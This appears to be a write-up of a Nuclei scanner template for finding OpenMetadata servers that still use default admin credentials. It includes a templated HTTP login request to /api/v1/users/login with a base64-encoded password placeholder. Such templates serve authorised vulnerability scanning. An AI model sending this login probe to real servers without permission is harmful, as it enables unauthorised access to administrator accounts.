# Nuclei Template: OpenMetadata - Default Login
**Template ID:** openmetadata-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`openmetadata-default-login.yaml`)

## Vulnerability Information & PoC

## Description
OpenMetadata server enables default admin credentials. An attacker can execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /api/v1/users/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"email":"{{username}}","password": "{{base64("{{password}}")}}"}
```

## References
- https://github.com/open-metadata/OpenMetadata
